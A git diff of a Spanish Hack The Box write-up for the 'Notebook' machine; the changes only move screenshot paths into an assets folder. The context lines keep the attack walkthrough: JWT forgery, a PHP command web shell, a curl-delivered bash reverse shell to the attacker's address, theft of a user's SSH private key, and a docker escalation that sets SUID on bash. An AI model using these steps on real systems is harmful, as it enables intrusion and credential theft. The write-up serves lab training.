@@ -1,5 +1,5 @@
 
-![](2022-07-01-09-32-18.png)
+![](assets/2022-07-01-09-32-18.png)
 - #Author: José Luis Íñigo
 - #Nickname: Riskoo
 - #Machine notebook Hack the box
@@ -12,7 +12,7 @@
 
 Realizamos un ping para ver si estamos conectados a la máquina.
 
-![](2022-07-01-09-37-27.png)
+![](assets/2022-07-01-09-37-27.png)
 
 > Al ser u nttl de 63 ~ 64 se trata de una máquina linux
 
@@ -65,7 +65,7 @@ Aquí está el proyecto rxapi https://rxapi.js.gl/
 feroxbuster - u http://10.10.10.230
 ```
 
-![](2022-07-01-12-07-33.png)
+![](assets/2022-07-01-12-07-33.png)
 
 >admin,login,logout,register
 
@@ -73,7 +73,7 @@ feroxbuster - u http://10.10.10.230
 
 En mi burpsuite tengo una extensión que se llama jwt editor que te marca cuando aparece un jwt. Se instala desde BAPP aunque también podrías ir uno a uno mirando.
 
-![](2022-07-01-12-10-41.png)
+![](assets/2022-07-01-12-10-41.png)
 
 Tenemos un jwt que guardamos en un token
 
@@ -86,14 +86,14 @@ uuid=c11878ca-8750-47f2-9fcf-c33a0e63f917
 ## Desde burpsuite podemos ir a target y ver los posibles problemas que tiene la web
 
 
- ![](2022-07-01-12-26-02.png)
+ ![](assets/2022-07-01-12-26-02.png)
 
 
 ## Comprobamos en jwt.io cuando por url kid pide una private key
 > Vemos que coge desde localhost una private key. 
 
 
-![](2022-07-01-14-48-12.png)
+![](assets/2022-07-01-14-48-12.png)
 
 En este caso vamos a hemos hecho lo siguiente
 
@@ -109,7 +109,7 @@ En este caso vamos a hemos hecho lo siguiente
 
 Para hacer esto hemos tenido la pista de la priv.key , el admin_cap por lo que es una buena idea probar esto pronto.
 
-![](2022-07-01-15-03-02.png)
+![](assets/2022-07-01-15-03-02.png)
 
 Ahora podemos ir a admin
 
@@ -133,7 +133,7 @@ Ahora subo el php que siempre usamos con el cmd para ver si nos da algún tipo d
 ```
 Una vez capturamos la entrada cambiamos como siempre por ?cmd=whoami para ver que pasa
 
-![](2022-07-01-19-27-21.png)
+![](assets/2022-07-01-19-27-21.png)
 
 No hemos tenido que hacer mucho, por lo que ahora mediante un curl mandaremos la revert shell
 
@@ -150,7 +150,7 @@ Modificamos el curl básico con revert shell a nuestras especificaciones
 
 curl -s -G http://10.10.10.230/a1ba6293840f8a8fb4d5dda74c98c90a.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.9/444 0>&1'" 
 ```
-![](2022-07-01-19-48-41.png)
+![](assets/2022-07-01-19-48-41.png)
 
 Muchas veces tenemos que cambiar lo ' por " 
 
@@ -183,7 +183,7 @@ stty rows 61 columns 236
 
 ```
 
-![](2022-07-01-19-52-32.png)
+![](assets/2022-07-01-19-52-32.png)
 
 Me las he dado de listo y nada , no tenemos permisos para leer user.txt
 
@@ -193,7 +193,7 @@ He estado mirando varias cosas. Siempre que no encontremos nada por encima y sep
 
 He realizado un tar xf home.tar.gz y aunque no nos deja descomprimir aparece lo siguiente. un id_rsa
 
-![](2022-07-01-20-06-19.png)
+![](assets/2022-07-01-20-06-19.png)
 
 cat /home/noah/.ssh/id_rsa
 
@@ -250,7 +250,7 @@ Uh6he5GM5rTstMjtGN+OQ0Z8UZ6c0HBM0ulkBT9IUIUEdLFntA4oAVQ=
 
 ssh noah@10.10.10.230 -i id_rsa
 
-![](2022-07-01-20-13-02.png)
+![](assets/2022-07-01-20-13-02.png)
 
 # Escalada de privilegios
 
@@ -286,7 +286,7 @@ tar xvzf go1.18.3.linux-amd64.tar.gz
 
 Una vez ya sabemos que go funciona, vamos a ver que exploit bash le vamos a meter. Para ello lo primero que se me ocurre es usar nuestra misma id_rsa de ante y pasarla como a /root/.ssh/Autorithedkeys
 
-![](2022-07-01-21-36-49.png)
+![](assets/2022-07-01-21-36-49.png)
 
 Por lo que sería algo así en el codigo de go
 ```bash
@@ -356,7 +356,7 @@ chmod +x exploit
 ```
 Consola 2
 
-![](2022-07-02-09-35-01.png)
+![](assets/2022-07-02-09-35-01.png)
 
 En la consola 1 nos metemos también en docker 
 ```bash
@@ -368,12 +368,12 @@ En consola 2 volvemos a ejecutar el exploit
 
 Recordad que esto último es copiado de s4vitar
 
-![](2022-07-02-09-38-39.png)
+![](assets/2022-07-02-09-38-39.png)
 
 con ls -l /bin/bash nos aparece que ya es u+s 
 
-![](2022-07-02-09-39-52.png)
+![](assets/2022-07-02-09-39-52.png)
 
 Con el comando bash -p ya somos root
 
-![](2022-07-02-09-40-33.png)
+![](assets/2022-07-02-09-40-33.png)
